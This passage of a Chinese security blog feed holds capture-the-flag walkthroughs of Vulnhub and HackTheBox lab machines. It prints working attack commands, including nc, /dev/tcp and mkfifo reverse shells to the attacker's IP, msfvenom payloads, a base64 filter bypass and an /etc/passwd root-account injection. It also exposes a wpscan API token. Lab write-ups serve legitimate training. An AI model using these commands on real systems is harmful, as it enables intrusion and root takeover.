<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --stdout -a 0 -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;rockyou-30000.rule plzsub.txt  &gt; dict</span><br></pre></td></tr></table></figure>

<p>john破解即可</p>
<p><img src="/images/Delivery/14.png" alt="14"></p>
<p>当然，ssh肯定不允许root登录，要不然爆破就完事了</p>
<p><img src="/images/Delivery/15.png" alt="15"></p>
<p><strong>su root</strong>结束</p>
<p><img src="/images/Delivery/16.png" alt="16"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好像如果一开始爆破su密码也不错，可以写个bash利用这条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ars@kali:~$ echo toor |su root -c id</span><br><span class="line">Password: uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">ars@kali:~$ echo toorsss |su root -c id</span><br><span class="line">Password: su: Authentication failure</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场DerpNStink 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BADerpNStink-1/</url>
    <content><![CDATA[<p>kali:192.168.1.201<br>目标:192.168.1.206</p>
<p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.206	derpnstink.local</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/DerpNStink-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/DerpNStink-1/2.png" alt="2"></p>
<p>weblog发现wordpress</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接进行wps扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token FgsbSSc5AS81Sr5jp3CpnwZ0Mp1dcimOMpqpQpLeDsc --url http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">slideshow gallery</span><br></pre></td></tr></table></figure>

<p>并且发现了slideshow gallery的插件版本</p>
<p><img src="/images/DerpNStink-1/4.png" alt="4"></p>
<p>寻找公开漏洞</p>
<p><img src="/images/DerpNStink-1/5.png" alt="5"></p>
<p>尝试使用</p>
<p><img src="/images/DerpNStink-1/6.png" alt="6"></p>
<p>发现需要登录凭据，手动尝试到wp-admin登录，发现弱口令admin/admin</p>
<p><img src="/images/DerpNStink-1/3.png" alt="3"></p>
<p>登录进去后发现不能使用常规手段反弹shell，还是得需要文件上传</p>
<p><img src="/images/DerpNStink-1/6.png" alt="6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 34681.py -t http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog -u admin -p admin -f shell.php</span><br></pre></td></tr></table></figure>

<p>这里有个坑，文件名不能包含<code>_</code>，比如<code>reverse_shell.php</code>死活不行，改个命就好了</p>
<p><img src="/images/DerpNStink-1/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核脏牛提权失败</p>
<p>连接mysql</p>
<p><img src="/images/DerpNStink-1/8.png" alt="8"></p>
<p>发现账户</p>
<p><img src="/images/DerpNStink-1/9.png" alt="9"></p>
<p>破解哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到wedgie57</p>
<p><img src="/images/DerpNStink-1/10.png" alt="10"></p>
<p>尝试改密码切换其他用户</p>
<p><img src="/images/DerpNStink-1/11.png" alt="11"></p>
<p>切换成功，但是先别急，先去看看21端口有什么，可以使用这个凭证</p>
<p><img src="/images/DerpNStink-1/12.png" alt="12"></p>
<p>发现了文件</p>
<p><img src="/images/DerpNStink-1/13.png" alt="13"></p>
<p>是一个私钥，但测试后发现，还是stinky这个用户的<br>在home目录下的Documents发现了pcap包，传送到kali里分析<br>过滤http的post请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.method&#x3D;&#x3D;POST</span><br></pre></td></tr></table></figure>

<p><img src="/images/DerpNStink-1/14.png" alt="14"></p>
<p>发现了mrderp的凭证，derpderpderpderpderpderpderp</p>
<p>枚举sudo权限</p>
<p><img src="/images/DerpNStink-1/15.png" alt="15"></p>
<p>发现可以执行任何命令，在/home/mrderp/binaries/目录，文件名必须以derpy为开头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir binaries</span><br><span class="line">cd binaries&#x2F;</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; derpy.sh</span><br><span class="line">chmod +x derpy.sh</span><br><span class="line">sudo .&#x2F;derpy.sh </span><br></pre></td></tr></table></figure>

<p><img src="/images/DerpNStink-1/16.png" alt="16"></p>
<p>提权小心脏牛内核提权把系统给打崩了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld.local (Bravery)</title>
    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Bravery/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Bravery"><a href="#Digitalworld-local-Bravery" class="headerlink" title="Digitalworld.local(Bravery)"></a>Digitalworld.local(Bravery)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.253</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bravery/1.jpg" alt="1"></p>
<p>通过扫描可以发现该站点拥有80、8080两个web服务、SMB服务、NFS共享(2049)、ssh</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>我是用<code>nikto</code>分别扫描了8080和80端口，从8080端口处发现了<code>robots.txt</code></p>
<p><img src="/images/Bravery/2.jpg" alt="2"></p>
<p><img src="/images/Bravery/3.jpg" alt="3"></p>
<p>dirb扫描了80和8080的web目录，发现了一个目录遍历</p>
<p><img src="/images/Bravery/4.jpg" alt="4"></p>
<p><img src="/images/Bravery/5.jpg" alt="5"></p>
<p>查看nfs可以挂载的共享信息，挂载之后查看文件</p>
<p><img src="/images/Bravery/6.jpg" alt="6"></p>
<p><img src="/images/Bravery/7.jpg" alt="7"></p>
<p>其中<code>qwertyuioplkjhgfdsazxcvb</code>看上去像一个密码</p>
<p>enum4linux枚举的smb信息</p>
<p><img src="/images/Bravery/9.jpg" alt="9"></p>
<p>查看无密码smb分享</p>
<p><img src="/images/Bravery/8.jpg" alt="8"></p>
<p>当我想查看secured这个目录时，发现它是有密码保护的<br>我使用枚举出的用户david和之前找到的密码，成功进入</p>
<p>可以使用smb命令提示符下载后查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;Desktop</span><br><span class="line">smbclient &#x2F;&#x2F;192.168.1.253&#x2F;secured -U David</span><br><span class="line">Enter WORKGROUP\david&#39;s password:: qwertyuioplkjhgfdsazxcvbnm</span><br><span class="line">get david.txt</span><br><span class="line">get genevieve.txt</span><br><span class="line">get README.txt</span><br></pre></td></tr></table></figure>

<p>或者<code>mount -o username=</code>挂载查看</p>
<p><img src="/images/Bravery/10.jpg" alt="10"></p>
<p>从中发现了两个有趣的网址</p>
<p><img src="/images/Bravery/11.jpg" alt="11"></p>
<p><code>192.168.1.253/devops/directortestpagev1.php</code>是一个404</p>
<p><code>192.168.1.253/genevieve</code>出现如下页面</p>
<p><img src="/images/Bravery/12.jpg" alt="12"></p>
<p>而且当我单机<code>Knowledge Management</code>，跳转到了<code>cuppaCMS</code></p>
<p><img src="/images/Bravery/13.jpg" alt="13"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI/RFI"></a>LFI/RFI</h3><p>searsploit寻找漏洞</p>
<p><img src="/images/Bravery/14.jpg" alt="14"></p>
<p>LFI成功</p>
<p><img src="/images/Bravery/15.jpg" alt="15"></p>
<p>RFI成功</p>
<p><img src="/images/Bravery/16.jpg" alt="16"></p>
<h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>自己写入木马，侦听端口即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	print system(&quot;nc -nv 192.168.1.3 4444 -e &#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>或者获取meterpreter会话都是不错的选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;8888 -f raw -o evil.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bravery/17.jpg"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>SUID提权</p>
<p>SUID权限的文件执行时，不会以当前用户权限执行，而会以文件拥有者的权限执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;				根目录</span><br><span class="line">-perm -u&#x3D;s		搜索SUID权限的文件</span><br><span class="line">-type f			普通文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;null		过滤错误信息	0——标准输入（stdin）		1——标准输出（stdout）		2——标准错误（stderr）</span><br></pre></td></tr></table></figure>

<p>过程可能会比较慢，耐心等待</p>
<p><img src="/images/Bravery/18.jpg" alt="18"></p>
<p>竟然找到了cp命令，我们可以利用它以root权限，替换各类敏感文件进行提权</p>
<p>我们可以打开受害者的<code>/etc/passwd</code>，添加用户提权</p>
<p><img src="/images/Bravery/19.jpg" alt="19"></p>
<p>创建账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>传输与替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.1.3&#x2F;passwd</span><br><span class="line">cp passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bravery/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld.local(Development)</title>
    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Development/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Development"><a href="#Digitalworld-local-Development" class="headerlink" title="Digitalworld.local(Development)"></a>Digitalworld.local(Development)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Development/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080端口运行的web服务</p>
<p><img src="/images/Development/2.jpg" alt="2"></p>
<p>发现一个页面， 提示去查看<code>html_pages</code></p>
<p><img src="/images/Development/3.jpg" alt="3"></p>
<p>根据之前的提示，应该要去访问<code>development.html</code></p>
<p><img src="/images/Development/4.jpg" alt="4"></p>
<p>接着又提示访问<code>developmentsecretpage</code></p>
<p>最后来到下面的登录框</p>
<p><img src="/images/Development/5.jpg" alt="5"></p>
<p>随便输入一些内容，最终跳到了下面的页面</p>
<p><img src="/images/Development/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="exploitDB"><a href="#exploitDB" class="headerlink" title="exploitDB"></a>exploitDB</h3><p>页面比较有用的提示是<code>slogin_lib.inc.php</code></p>
<p>我在<a href="https://www.exploit-db.com/exploits/7444">exploitDB</a>中找到了相关漏洞</p>
<p><img src="/images/Development/7.jpg" alt="7"></p>
<p>它会在<code>slog_users.txt</code>中存放一个明文用户名和未加盐的hash密码</p>
<p><img src="/images/Development/8.jpg" alt="8"></p>
<p>使用hashcat破解md5</p>
<p><img src="/images/Development/9.png" alt="9"></p>
<p>破解出了三个密码</p>
<p>尝试进行ssh，用户intern是可以建立连接的，不过是个rbash</p>
<p><img src="/images/Development/10.jpg" alt="10"></p>
<h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>既然有echo，就可以尝试python来逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Development/11.jpg" alt="11"></p>
<p>逃逸成功</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>内核版本为4.15</p>
<p><img src="/images/Development/12.jpg" alt="12"></p>
<p>搜索公开漏洞，发现可以使用<a href="https://github.com/bcoles/kernel-exploits">CVE-2018-18955</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bcoles&#x2F;kernel-exploits.git</span><br><span class="line">cd kernel-exploits&#x2F;CVE-2018-18955&#x2F; </span><br><span class="line">gcc subuid_shell.c -o exp</span><br><span class="line">.&#x2F;exp</span><br><span class="line">gcc subshell.c -o subshell</span><br><span class="line">.&#x2F;subshell</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Development/15.jpg" alt="15"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><code>/etc/passwd</code>发现，patrick也拥有bash shell，不过之前ssh连接不上</p>
<p>尝试使用su切换用户，成功用patrick登录</p>
<p><img src="/images/Development/17.jpg" alt="17"></p>
<p>而且该账户可以使用root权限使用vim和nano这样的文本编辑器</p>
<p>那就代表可以修改<code>/etc/passwd</code>这样存放敏感信息的文件进行提权</p>
<p>也可以运行vim输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接获取root bash</p>
<p><img src="/images/Development/18.jpg" alt="18"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Djinn 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BADjinn-1/</url>
    <content><![CDATA[<h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn 1"></a>Djinn 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.250</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.250 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.250 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Djinn-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>7331端口进行目录扫描</p>
<p>发现/wish目录</p>
<p><img src="/images/Djinn-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>看样子是一个命令注入的漏洞，使用burp看看情况</p>
<p>输入命令whoami，发现了回显竟然在location</p>
<p><img src="/images/Djinn-1/3.png" alt="3"></p>
<p>跟着跳转也没什么大的发现</p>
<p>接着输入命令cat /etc/passwd，回显显示命令失败</p>
<p><img src="/images/Djinn-1/4.png" alt="4"></p>
<p>看来有一定的限制需要进行绕过，通过上一步，我们可以推断也许过滤<code>/</code>或者<code>空格</code><br>我们使用echo命令进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/6.png" alt="6"></p>
<p>看来空格允许，但是<code>/</code>不可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/7.png" alt="7"></p>
<p><code>.</code>也不可以</p>
<p><img src="/images/Djinn-1/8.png" alt="8"></p>
<p><code>=</code>可以，<code>%</code>可以</p>
<p><img src="/images/Djinn-1/9.png" alt="9"></p>
<p><code>|</code>可以</p>
<p>可以确认/也不可以 .也不可以，可以用base64绕过<br>我们会使用到之前验证的|，空格，=号(也许)，%</p>
<p>base64编码payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>接着解码调用bash执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAxLzQ0MyAwPiYxIg&#x3D;&#x3D; |base64 -d |bash</span><br></pre></td></tr></table></figure>

<p>对其进行url编码发送过去<br>这样就拿到了shell</p>
<p><img src="/images/Djinn-1/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到shell之后，就在/opt/80目录<br>linpeas扫描发现了这个目录可写</p>
<p><img src="/images/Djinn-1/11.png" alt="11"></p>
<p>查看这个目录下的文件</p>
<p><img src="/images/Djinn-1/12.png" alt="12"></p>
<p>发现了凭证文件</p>
<p><img src="/images/Djinn-1/13.png" alt="13"></p>
<p>切换过去</p>
<p><img src="/images/Djinn-1/14.png" alt="14"></p>
<p>之后发现能sudo以sam执行genie，不知道这个程序是干嘛的，执行看看</p>
<p><img src="/images/Djinn-1/15.png" alt="15"></p>
<p>-h发现了它似乎有执行命令的参数，尝试切换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -e bash</span><br></pre></td></tr></table></figure>

<p>但是失败了，尝试man看一看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man genie</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/16.png" alt="16"></p>
<p>尝试别的执行命令的方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd bash		&#x2F;&#x2F;失败</span><br><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd sh			&#x2F;&#x2F;失败</span><br><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd id			&#x2F;&#x2F;成功</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/17.png" alt="17"></p>
<p>接下来更坑，发现了sudo执行的程序</p>
<p><img src="/images/Djinn-1/18.png" alt="18"></p>
<p>又不知道是干嘛的，接着在当前用户的home目录发现了奇怪的文件</p>
<p><img src="/images/Djinn-1/19.png" alt="19"></p>
<p>传送到kali，需要将pyc转换成py，使用uncompyle2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;wibiti&#x2F;uncompyle2</span><br><span class="line">cd uncompyle2</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uncompyle2 a.pyc -o origin.py</span><br></pre></td></tr></table></figure>

<p>之后读它源码</p>
<p><img src="/images/Djinn-1/20.png" alt="20"></p>
<p>这题命令注入的绕过还挺有意思，后面就….</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld-local-MERCY v2</title>
    <url>/2020/05/26/%E9%9D%B6%E5%9C%BADigitalworld-local-MERCYv2/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Mercyv2"><a href="#Digitalworld-local-Mercyv2" class="headerlink" title="Digitalworld.local (Mercyv2)"></a>Digitalworld.local (Mercyv2)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.209</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Mercyv2/1.jpg" alt="1"></p>
<p>扫描出22、80处于filtered，开放了pop3，SMB，8080等服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>smb枚举</p>
<p><img src="/images/Mercyv2/2.jpg" alt="2"></p>
<p>Nmap进攻扫描已经扫出了一个目录<code>/tryharder/tryharder</code><br>得到一段密文，使用base64解码</p>
<p><img src="/images/Mercyv2/3.jpg" alt="3"></p>
<p>大意说有个人使用<code>password</code>作为密码</p>
<p>猜测该密码为smb密码，尝试连接，用户名为qiu</p>
<p><img src="/images/Mercyv2/4.jpg" alt="4"></p>
<p>连接后发现该目录下存在隐藏文件夹，搜寻后发现，HTTP和SSH配置了<code>knockd</code></p>
<p>按顺序敲门</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in 159 27391 4; do nc -nv 192.168.1.209 $x; done</span><br><span class="line">for x in 17301 28504 9999; do nmap -Pn -p $x 192.168.1.209; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mercyv2/5.jpg" alt="5"></p>
<p>成功打开服务，这样我们就可以收集80端口上的信息了</p>
<p>dirb扫描80端口</p>
<p><img src="/images/Mercyv2/6.jpg" alt="6"></p>
<p>又扫描出了robots.txt</p>
<p><img src="/images/Mercyv2/7.jpg" alt="7"></p>
<p>提示我们两个路径</p>
<p><img src="/images/Mercyv2/8.jpg" alt="8"></p>
<p>在<code>nomercy</code>里发现了rips 0.53</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p><img src="/images/Mercyv2/10.jpg" alt="10"></p>
<p><img src="/images/Mercyv2/9.jpg" alt="9"></p>
<p>LFI利用成功</p>
<p>利用LFI，我们可以读取之前提示的tomcat用户信息</p>
<p><img src="/images/Mercyv2/11.jpg" alt="11"></p>
<p>成功发现账户和密码</p>
<p><img src="/images/Mercyv2/12.jpg" alt="12"></p>
<p>我们使用管理员账户和密码<code>thisisasuperduperlonguser/heartbreakisinevitable</code>登录管理界面</p>
<p><img src="/images/Mercyv2/13.jpg" alt="13"></p>
<h4 id="tomcat部署war-getshell"><a href="#tomcat部署war-getshell" class="headerlink" title="tomcat部署war getshell"></a>tomcat部署war getshell</h4><p>生成war包木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;4444 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>点击即可getshell</p>
<p><img src="/images/Mercyv2/14.png" alt="14"></p>
<p>将shell提升为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>接着切换用户为fluffy，密码在tomcat管理文件里</p>
<p><img src="/images/Mercyv2/14.png" alt="14"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cron-job"><a href="#cron-job" class="headerlink" title="cron job"></a>cron job</h3><p><img src="/images/Mercyv2/15.jpg" alt="15"></p>
<p>在home目录内发现能以root权限运行的程序timeclock，并且我具有W修改权限，观察<code>192.168.1.209/time</code>，这个文件应该是cron job，</p>
<p><img src="/images/Mercyv2/17.jpg" alt="17"></p>
<p>我追加了下面这条语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.3 5555 1&gt;&#x2F;tmp&#x2F;f&quot; &gt;&gt; timeclock</span><br><span class="line">echo &quot;....&quot; &gt;&gt; XX 				&#x2F;&#x2F;追加</span><br><span class="line">rm &#x2F;tmp&#x2F;f						&#x2F;&#x2F;删除，因为是定时任务</span><br><span class="line">mknod &#x2F;tmp&#x2F;f p					&#x2F;&#x2F;创建管道f		mkfifo创建也可以</span><br><span class="line">&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f					&#x2F;&#x2F;将shell的输入重定向到管道f</span><br><span class="line">nc 192.168.1.3 5555 1&gt;&#x2F;tmp&#x2F;f		&#x2F;&#x2F;连接目标IP端口，将shell的输出重定向管道中</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mercyv2/16.jpg" alt="16"></p>
<p>等待程序执行，即可获取root shell</p>
<p><img src="/images/Mercyv2/18.jpg" alt="18"></p>
<h3 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h3><p><img src="/images/Mercyv2/19.jpg" alt="19"></p>
<p>内核4.4.0，还是i686，可以使用脏牛</p>
<p>这里有坑，目标机器上没有gcc，且我在64位上编译到目标机器上执行会报错，在32位下编译可以解决这个问题</p>
<p><img src="/images/Mercyv2/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:TheNoteBook</title>
    <url>/2021/03/15/HTB-TheNoteBook/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="bbc2bc6aa54e335cd5f033a7ce13e3647611f32b90a1890b16bc124a7574c67b">dc0972cb1b36024ed737b5d1c8512d8b886a16d305a1b946a69a7d021bf1884596e04e83df89b92e3aad6c3f2d071e06f7af673c61d110fb797b11e52e00a05b7a8a083437ec69696b49f1fa718aaab3ee0cae8fda93a283c2bef08720e8708086dd95034d8fa0827dd850fb7adc5a098a3395637cd9c844a3d42c628e6ac46d11cbe6e603beb61a53ec7e6ad1737ed8166ac29d071b051cb0c53db8b4446363653c21d7e4aa44e002759472d95b2ce95df19a16e89f637ba7514a10353f678f04d4b2883ae40725ceba502f5164b8398d3055111402ed35f2155857ac5b2121618eef623cd206860f51c3f8c654c29f4090fbe67602b7737a3816ecff1ac54d41fed1823f78dad35beee78fdc9d2a47c2f4782cbd102e98714f5758e3ebbe51141f74f3c884237337d94c3bc9104b53418ca0daf355e08587a2bc5136004241adbeadc8456fe4197116500b2367259a0f600da448a82c18138fd61efac6474a8bdde68dc0c00bfc4759f6b8b8d8cd816961c5cc2aa63f2c4e0470eafb02ee76aaef31b2c13c1ba9ee9ef69366814142dd2cdc6e6481e576f4d21d2de9f9129d9c95ff7dce663d899808f5b64f7e1eba8b6b9dca71b8266588ed8467c3571e0647dd6caf224d3278102beaae5a74d91484491ff80ca7ca137b021c3b538d1c01c8b2f918b480c6ba658b9ec59322516e47feb90330f9b83d51ca1652545b9155f9df2cdd11eff4aa79d29536b85281e8306ad9cf247198d836524a0d8395707710c9262e4b590a61ac0395c401e49428ec9bbd4c0779df07b9670ff199c034956353bfef0a9dfd420fb6facfd8451d928c9266b6148b27581062657c8bd65c175d4201f2d38ab45bc0fd